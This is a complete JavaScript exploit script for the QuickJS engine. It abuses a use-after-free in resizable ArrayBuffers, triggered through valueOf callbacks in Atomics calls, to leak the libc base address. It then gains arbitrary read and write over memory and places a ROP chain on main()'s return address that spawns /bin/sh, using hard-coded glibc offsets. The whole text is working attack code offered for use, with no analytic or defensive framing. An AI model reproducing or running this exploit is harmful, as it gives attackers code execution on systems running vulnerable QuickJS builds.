// exec-shell-cfi exploit for QuickJS (Full RELRO + Clang CFI)
// Primitive: overwrite main() return address with a libc ROP chain (ret; pop rdi; ret; system("/bin/sh")).

function read64(u8, off) {
  let v = 0n;
  for (let i = 0; i < 8; i++) {
    v |= BigInt(u8[off + i]) << (8n * BigInt(i));
  }
  return v;
}

function write64(u8, off, v) {
  v = BigInt.asUintN(64, v);
  for (let i = 0; i < 8; i++) {
    u8[off + i] = Number((v >> (8n * BigInt(i))) & 0xffn);
  }
}

// --------------------
// libc offsets (Debian glibc 2.41 in this environment)
// --------------------
const OFF_UNSORTED_FD = 0x1e7b20n; // fd pointer from unsorted bin chunk freed from malloc(0x500)
const OFF_ENVIRON     = 0x1eee28n;
const OFF_RET         = 0x2846bn;
const OFF_POP_RDI_RET = 0x2a145n;
const OFF_SYSTEM      = 0x53110n;
const OFF_BINSH       = 0x1a7ea4n;
const OFF__EXIT       = 0xdd280n;

// At main() entry: return address location = environ_value - 0x128
const OFF_ENV_TO_MAIN_RETLOC = 0x128n;

function leak_libc_base() {
  // Get an unsorted-bin libc pointer by freeing a >tcache chunk via RAB resize.
  let ab = new ArrayBuffer(0x500, { maxByteLength: 0x1200 });
  let ta = new BigUint64Array(ab);

  // Heap feng shui: keep some allocation alive so realloc is less likely to extend in-place.
  let guard = new ArrayBuffer(0x600);

  let evil = {
    valueOf() {
      // Grow the RAB to force realloc() and free the old 0x500 chunk.
      ab.resize(0x900);
      // compareExchange expected value (won't match unsorted fd pointer)
      return 0n;
    }
  };

  // Stale pointer points into the freed chunk; compareExchange reads fd without writing.
  let leak = Atomics.compareExchange(ta, 0, evil, 0n);
  return leak - OFF_UNSORTED_FD;
}

function make_arb_u8(where) {
  // Create a RAB whose backing store chunk is later freed, then reclaimed by a Uint8Array JSObject.
  // Use the Atomics.store stale pointer to overwrite the Uint8Array's u.array.u.ptr with |where|.

  let ab = new ArrayBuffer(0x48, { maxByteLength: 0x1000 });
  let ta = new BigUint64Array(ab);

  // Keep something allocated to reduce realloc-in-place chance.
  let guard = new ArrayBuffer(0x200);

  // Backing buffer for the victim; make it large so count is large after corruption.
  let backing = new ArrayBuffer(0x200000);
  let victim;

  let evil = {
    valueOf() {
      ab.resize(0x500);
      // This allocation (JSObject for Uint8Array) reuses the freed 0x48 RAB data chunk.
      victim = new Uint8Array(backing);
      return where;
    }
  };

  // index 7 => offset 0x38 in JSObject (u.array.u.ptr) for typed arrays in this build.
  Atomics.store(ta, 7, evil);
  return victim;
}

// --------------------
// Exploit
// --------------------
let libc_base = leak_libc_base();

let environ_addr = libc_base + OFF_ENVIRON;
let u8_env = make_arb_u8(environ_addr);
let envp = read64(u8_env, 0);

let main_ret_loc = envp - OFF_ENV_TO_MAIN_RETLOC;

// Build a small ROP chain on main()'s stack.
let rop_ret     = libc_base + OFF_RET;
let rop_pop_rdi = libc_base + OFF_POP_RDI_RET;
let rop_system  = libc_base + OFF_SYSTEM;
let rop_binsh   = libc_base + OFF_BINSH;
let rop__exit   = libc_base + OFF__EXIT;

let u8_stack = make_arb_u8(main_ret_loc);
write64(u8_stack, 0,  rop_ret);
write64(u8_stack, 8,  rop_pop_rdi);
write64(u8_stack, 16, rop_binsh);
write64(u8_stack, 24, rop_system);
write64(u8_stack, 32, rop__exit);

// Let the script finish. When qjs main() returns, it will jump into the ROP chain.
